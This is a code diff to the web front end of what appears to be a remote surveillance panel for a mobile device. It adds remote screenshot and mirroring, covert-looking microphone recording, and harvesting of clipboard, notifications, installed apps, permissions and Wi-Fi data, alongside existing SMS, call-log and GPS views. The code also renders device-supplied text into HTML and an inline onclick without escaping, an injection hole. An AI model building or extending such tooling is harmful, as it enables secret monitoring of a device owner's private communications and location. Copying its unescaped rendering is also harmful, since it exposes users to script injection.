@@ -47,6 +47,17 @@ class DeviceManager {
         document.getElementById('start-mirroring').addEventListener('click', () => this.startMirroring());
         document.getElementById('stop-mirroring').addEventListener('click', () => this.stopMirroring());
         
+        // Microphone buttons
+        document.getElementById('start-recording').addEventListener('click', () => this.startMicrophone());
+        document.getElementById('stop-recording').addEventListener('click', () => this.stopMicrophone());
+        
+        // Other feature buttons
+        document.getElementById('refresh-clipboard').addEventListener('click', () => this.requestClipboard());
+        document.getElementById('refresh-notifications').addEventListener('click', () => this.requestNotifications());
+        document.getElementById('refresh-apps').addEventListener('click', () => this.requestApps());
+        document.getElementById('refresh-permissions').addEventListener('click', () => this.requestPermissions());
+        document.getElementById('refresh-wifi').addEventListener('click', () => this.requestWifi());
+        
         // File upload
         document.getElementById('file-upload').addEventListener('change', (e) => this.handleFileUpload(e));
     }
@@ -139,6 +150,11 @@ class DeviceManager {
             this.renderSMS();
             this.renderCallLog();
             this.renderFiles();
+            this.renderClipboard();
+            this.renderNotifications();
+            this.renderApps();
+            this.renderPermissions();
+            this.renderWifi();
             
             // Update map if GPS section is active
             if (document.getElementById('gps-section').classList.contains('active')) {
@@ -586,25 +602,38 @@ class DeviceManager {
         }
 
         try {
+            // Show loading state immediately
+            document.getElementById('screen-display').innerHTML = `
+                <div class="text-center">
+                    <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
+                    <p class="text-sm text-gray-500">Taking screenshot...</p>
+                </div>
+            `;
+            
             const response = await fetch(`/api/devices/${this.currentDeviceId}/screenshot`, {
                 method: 'POST'
             });
             const result = await response.json();
             
             if (result.success) {
+                // Check for screenshot after delay
+                setTimeout(() => this.checkForScreenshot(), 3000);
+            } else {
                 document.getElementById('screen-display').innerHTML = `
-                    <div class="text-center">
-                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
-                        <p class="text-sm text-gray-500">Taking screenshot...</p>
+                    <div class="text-center text-red-500">
+                        <i class="fas fa-exclamation-triangle text-2xl mb-2 block"></i>
+                        <p class="text-sm">Failed to take screenshot</p>
                     </div>
                 `;
-                
-                // Check for screenshot after delay
-                setTimeout(() => this.checkForScreenshot(), 2000);
             }
         } catch (error) {
             console.error('Error taking screenshot:', error);
-            alert('Failed to take screenshot');
+            document.getElementById('screen-display').innerHTML = `
+                <div class="text-center text-red-500">
+                    <i class="fas fa-exclamation-triangle text-2xl mb-2 block"></i>
+                    <p class="text-sm">Error taking screenshot</p>
+                </div>
+            `;
         }
     }
 
@@ -612,17 +641,31 @@ class DeviceManager {
         if (!this.currentDeviceId) return;
         
         try {
-            const response = await fetch(`/api/devices/${this.currentDeviceId}/latest-screenshot`);
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/latest-screenshot?t=${Date.now()}`);
             if (response.ok) {
                 const blob = await response.blob();
                 const imageUrl = URL.createObjectURL(blob);
                 
                 document.getElementById('screen-display').innerHTML = `
-                    <img src="${imageUrl}" alt="Device Screenshot" class="max-w-full max-h-full object-contain rounded-lg">
+                    <img src="${imageUrl}" alt="Device Screenshot" class="max-w-full max-h-full object-contain rounded-lg shadow-lg">
+                `;
+            } else {
+                const errorData = await response.json();
+                document.getElementById('screen-display').innerHTML = `
+                    <div class="text-center text-red-500">
+                        <i class="fas fa-exclamation-triangle text-2xl mb-2 block"></i>
+                        <p class="text-sm">${errorData.error || 'Screenshot not available'}</p>
+                    </div>
                 `;
             }
         } catch (error) {
             console.error('Error loading screenshot:', error);
+            document.getElementById('screen-display').innerHTML = `
+                <div class="text-center text-red-500">
+                    <i class="fas fa-exclamation-triangle text-2xl mb-2 block"></i>
+                    <p class="text-sm">Error loading screenshot</p>
+                </div>
+            `;
         }
     }
 
@@ -641,12 +684,32 @@ class DeviceManager {
         // Start continuous screenshots
         this.mirroringInterval = setInterval(() => {
             if (this.isMirroring) {
-                this.takeScreenshot();
+                this.takeScreenshotForMirroring();
             }
         }, refreshRate);
         
         // Take initial screenshot
-        this.takeScreenshot();
+        this.takeScreenshotForMirroring();
+    }
+    
+    async takeScreenshotForMirroring() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline || !this.isMirroring) {
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/screenshot`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                // Check for screenshot after shorter delay for mirroring
+                setTimeout(() => this.checkForScreenshot(), 1000);
+            }
+        } catch (error) {
+            console.error('Error taking screenshot for mirroring:', error);
+        }
     }
 
     stopMirroring() {
@@ -659,6 +722,417 @@ class DeviceManager {
         
         document.getElementById('start-mirroring').style.display = 'inline-flex';
         document.getElementById('stop-mirroring').style.display = 'none';
+    }
+
+    async startMicrophone() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/start-microphone`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ quality: 'medium' })
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                document.getElementById('start-recording').style.display = 'none';
+                document.getElementById('stop-recording').style.display = 'inline-flex';
+                document.getElementById('microphone-status').innerHTML = `
+                    <div class="bg-red-100 border border-red-200 rounded-lg p-4">
+                        <div class="flex items-center">
+                            <i class="fas fa-microphone text-red-600 mr-2"></i>
+                            <span class="text-red-800 font-medium">Recording...</span>
+                        </div>
+                    </div>
+                `;
+            }
+        } catch (error) {
+            console.error('Error starting microphone:', error);
+            alert('Failed to start microphone recording');
+        }
+    }
+
+    async stopMicrophone() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/stop-microphone`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                document.getElementById('start-recording').style.display = 'inline-flex';
+                document.getElementById('stop-recording').style.display = 'none';
+                document.getElementById('microphone-status').innerHTML = `
+                    <div class="bg-gray-50 rounded-lg p-4">
+                        <p class="text-gray-500">Microphone stopped</p>
+                    </div>
+                `;
+            }
+        } catch (error) {
+            console.error('Error stopping microphone:', error);
+            alert('Failed to stop microphone recording');
+        }
+    }
+
+    async requestClipboard() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-clipboard`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                setTimeout(() => this.loadClipboard(), 2000);
+            }
+        } catch (error) {
+            console.error('Error requesting clipboard:', error);
+            alert('Failed to request clipboard');
+        }
+    }
+
+    async loadClipboard() {
+        if (!this.currentDeviceId) return;
+        
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/clipboard`);
+            const data = await response.json();
+            this.renderClipboard(data.clipboard);
+        } catch (error) {
+            console.error('Error loading clipboard:', error);
+        }
+    }
+
+    renderClipboard(clipboardData = []) {
+        const clipboardList = document.getElementById('clipboard-list');
+        
+        if (clipboardData.length > 0) {
+            clipboardList.innerHTML = `
+                <div class="divide-y divide-gray-200">
+                    ${clipboardData.map(item => `
+                        <div class="p-4 hover:bg-gray-50 transition-colors">
+                            <div class="flex items-start justify-between">
+                                <div class="flex-1">
+                                    <p class="text-sm text-gray-900 break-words">${item.text || 'Empty clipboard'}</p>
+                                    <p class="text-xs text-gray-500 mt-1">${new Date(item.timestamp).toLocaleString()}</p>
+                                </div>
+                                <button onclick="navigator.clipboard.writeText('${item.text}')" 
+                                        class="ml-2 text-blue-600 hover:text-blue-700 p-1 rounded">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        } else {
+            clipboardList.innerHTML = `
+                <div class="p-4 text-center text-gray-500">
+                    <i class="fas fa-clipboard text-4xl mb-2 block text-gray-300"></i>
+                    <p>No clipboard history</p>
+                    <p class="text-xs text-gray-400 mt-1">Click "Refresh" to load clipboard data</p>
+                </div>
+            `;
+        }
+    }
+
+    async requestNotifications() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-notifications`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                setTimeout(() => this.loadNotifications(), 2000);
+            }
+        } catch (error) {
+            console.error('Error requesting notifications:', error);
+            alert('Failed to request notifications');
+        }
+    }
+
+    async loadNotifications() {
+        if (!this.currentDeviceId) return;
+        
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/notifications`);
+            const data = await response.json();
+            this.renderNotifications(data.notifications);
+        } catch (error) {
+            console.error('Error loading notifications:', error);
+        }
+    }
+
+    renderNotifications(notifications = []) {
+        const notificationsList = document.getElementById('notifications-list');
+        
+        if (notifications.length > 0) {
+            notificationsList.innerHTML = `
+                <div class="divide-y divide-gray-200">
+                    ${notifications.map(notification => `
+                        <div class="p-4 hover:bg-gray-50 transition-colors">
+                            <div class="flex items-start">
+                                <div class="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center mr-3">
+                                    <i class="fas fa-bell text-blue-600"></i>
+                                </div>
+                                <div class="flex-1">
+                                    <div class="flex items-center justify-between mb-1">
+                                        <p class="text-sm font-medium text-gray-900">${notification.appName || 'Unknown App'}</p>
+                                        <span class="text-xs text-gray-500">${new Date(notification.receivedAt).toLocaleString()}</span>
+                                    </div>
+                                    <p class="text-sm text-gray-700">${notification.title || 'No title'}</p>
+                                    <p class="text-xs text-gray-500 mt-1">${notification.text || 'No content'}</p>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        } else {
+            notificationsList.innerHTML = `
+                <div class="p-4 text-center text-gray-500">
+                    <i class="fas fa-bell text-4xl mb-2 block text-gray-300"></i>
+                    <p>No notifications</p>
+                    <p class="text-xs text-gray-400 mt-1">Click "Refresh" to load notifications</p>
+                </div>
+            `;
+        }
+    }
+
+    async requestApps() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-apps`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                setTimeout(() => this.loadApps(), 2000);
+            }
+        } catch (error) {
+            console.error('Error requesting apps:', error);
+            alert('Failed to request apps');
+        }
+    }
+
+    async loadApps() {
+        if (!this.currentDeviceId) return;
+        
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/apps`);
+            const data = await response.json();
+            this.renderApps(data.apps);
+        } catch (error) {
+            console.error('Error loading apps:', error);
+        }
+    }
+
+    renderApps(apps = []) {
+        const appsList = document.getElementById('apps-list');
+        
+        if (apps.length > 0) {
+            appsList.innerHTML = `
+                <div class="divide-y divide-gray-200">
+                    ${apps.map(app => `
+                        <div class="p-4 hover:bg-gray-50 transition-colors">
+                            <div class="flex items-center">
+                                <div class="w-10 h-10 bg-gray-100 rounded-lg flex items-center justify-center mr-3">
+                                    <i class="fas fa-mobile-alt text-gray-600"></i>
+                                </div>
+                                <div class="flex-1">
+                                    <p class="text-sm font-medium text-gray-900">${app.name || 'Unknown App'}</p>
+                                    <p class="text-xs text-gray-500">${app.packageName || 'No package name'}</p>
+                                    <p class="text-xs text-gray-400">Version: ${app.version || 'Unknown'}</p>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-xs px-2 py-1 rounded-full ${app.isSystemApp ? 'bg-blue-100 text-blue-800' : 'bg-green-100 text-green-800'}">
+                                        ${app.isSystemApp ? 'System' : 'User'}
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        } else {
+            appsList.innerHTML = `
+                <div class="p-4 text-center text-gray-500">
+                    <i class="fas fa-mobile-alt text-4xl mb-2 block text-gray-300"></i>
+                    <p>No apps loaded</p>
+                    <p class="text-xs text-gray-400 mt-1">Click "Refresh" to load installed apps</p>
+                </div>
+            `;
+        }
+    }
+
+    async requestPermissions() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-permissions`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                setTimeout(() => this.loadPermissions(), 2000);
+            }
+        } catch (error) {
+            console.error('Error requesting permissions:', error);
+            alert('Failed to request permissions');
+        }
+    }
+
+    async loadPermissions() {
+        if (!this.currentDeviceId) return;
+        
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/permissions`);
+            const data = await response.json();
+            this.renderPermissions(data.permissions);
+        } catch (error) {
+            console.error('Error loading permissions:', error);
+        }
+    }
+
+    renderPermissions(permissions = []) {
+        const permissionsList = document.getElementById('permissions-list');
+        
+        if (permissions.length > 0) {
+            permissionsList.innerHTML = `
+                <div class="divide-y divide-gray-200">
+                    ${permissions.map(permission => `
+                        <div class="p-4 hover:bg-gray-50 transition-colors">
+                            <div class="flex items-center justify-between">
+                                <div class="flex items-center">
+                                    <div class="w-8 h-8 ${permission.granted ? 'bg-green-100' : 'bg-red-100'} rounded-full flex items-center justify-center mr-3">
+                                        <i class="fas fa-${permission.granted ? 'check' : 'times'} text-${permission.granted ? 'green' : 'red'}-600 text-xs"></i>
+                                    </div>
+                                    <div>
+                                        <p class="text-sm font-medium text-gray-900">${permission.name || 'Unknown Permission'}</p>
+                                        <p class="text-xs text-gray-500">${permission.description || 'No description'}</p>
+                                    </div>
+                                </div>
+                                <span class="text-xs px-2 py-1 rounded-full ${permission.granted ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}">
+                                    ${permission.granted ? 'Granted' : 'Denied'}
+                                </span>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        } else {
+            permissionsList.innerHTML = `
+                <div class="p-4 text-center text-gray-500">
+                    <i class="fas fa-shield-alt text-4xl mb-2 block text-gray-300"></i>
+                    <p>No permissions loaded</p>
+                    <p class="text-xs text-gray-400 mt-1">Click "Refresh" to load app permissions</p>
+                </div>
+            `;
+        }
+    }
+
+    async requestWifi() {
+        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
+            alert('Device is not available');
+            return;
+        }
+
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-wifi`, {
+                method: 'POST'
+            });
+            const result = await response.json();
+            
+            if (result.success) {
+                setTimeout(() => this.loadWifi(), 2000);
+            }
+        } catch (error) {
+            console.error('Error requesting wifi:', error);
+            alert('Failed to request wifi networks');
+        }
+    }
+
+    async loadWifi() {
+        if (!this.currentDeviceId) return;
+        
+        try {
+            const response = await fetch(`/api/devices/${this.currentDeviceId}/wifi`);
+            const data = await response.json();
+            this.renderWifi(data.networks, data.currentNetwork);
+        } catch (error) {
+            console.error('Error loading wifi:', error);
+        }
+    }
+
+    renderWifi(networks = [], currentNetwork = null) {
+        const wifiList = document.getElementById('wifi-list');
+        
+        if (networks.length > 0) {
+            wifiList.innerHTML = `
+                <div class="divide-y divide-gray-200">
+                    ${networks.map(network => `
+                        <div class="p-4 hover:bg-gray-50 transition-colors">
+                            <div class="flex items-center justify-between">
+                                <div class="flex items-center">
+                                    <div class="w-8 h-8 ${network.ssid === currentNetwork?.ssid ? 'bg-green-100' : 'bg-gray-100'} rounded-full flex items-center justify-center mr-3">
+                                        <i class="fas fa-wifi text-${network.ssid === currentNetwork?.ssid ? 'green' : 'gray'}-600 text-xs"></i>
+                                    </div>
+                                    <div>
+                                        <p class="text-sm font-medium text-gray-900">${network.ssid || 'Hidden Network'}</p>
+                                        <p class="text-xs text-gray-500">Security: ${network.security || 'Open'}</p>
+                                    </div>
+                                </div>
+                                <div class="text-right">
+                                    <div class="flex items-center space-x-2">
+                                        <span class="text-xs text-gray-500">${network.signalStrength || 0}%</span>
+                                        ${network.ssid === currentNetwork?.ssid ? 
+                                            '<span class="text-xs px-2 py-1 bg-green-100 text-green-800 rounded-full">Connected</span>' : 
+                                            ''
+                                        }
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+        } else {
+            wifiList.innerHTML = `
+                <div class="p-4 text-center text-gray-500">
+                    <i class="fas fa-wifi text-4xl mb-2 block text-gray-300"></i>
+                    <p>No WiFi networks</p>
+                    <p class="text-xs text-gray-400 mt-1">Click "Refresh" to scan for networks</p>
+                </div>
+            `;
+        }
     }
 
     async handleFileUpload(event) {
